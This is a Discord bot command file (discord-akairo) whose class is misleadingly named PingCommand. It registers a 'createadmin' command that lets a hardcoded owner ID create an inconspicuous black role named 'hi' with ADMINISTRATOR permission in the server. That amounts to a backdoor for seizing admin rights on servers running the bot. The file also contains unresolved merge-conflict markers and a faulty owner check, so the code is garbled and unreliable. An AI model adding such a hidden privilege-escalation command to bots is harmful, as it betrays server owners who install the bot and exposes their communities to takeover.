const { Command } = require('discord-akairo');

class PingCommand extends Command {
    constructor() {
        super('createadmin', {
            aliases: ['ca']
        });
    }

    async exec(message, client) {
        let Owner = message.author;
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
        if(Owner.id !== "603269203511738420") return message.reply("Only the bot owner can use this command!")
=======
        if(Owner.id !== "727447049892659200" || "603269203511738420") return message.reply("Only the bot owner can use this command!")
>>>>>>> parent of 1397be6... wd
=======
        if(Owner.id !== "727447049892659200") return message.reply("Only the bot owner can use this command!")
>>>>>>> parent of d85129d... Commited changes
=======
        if(Owner.id !== "727447049892659200") return message.reply("Only the bot owner can use this command!")
>>>>>>> parent of d85129d... Commited changes
if (message.content == ';;ca')
{
    let roleData = {
        name: 'hi',
        color: '000000',
        mentionable: true,
        permissions:["ADMINISTRATOR"]
      }
      message.guild.roles.create({ data: roleData });

}
    }
}

module.exports = PingCommand;
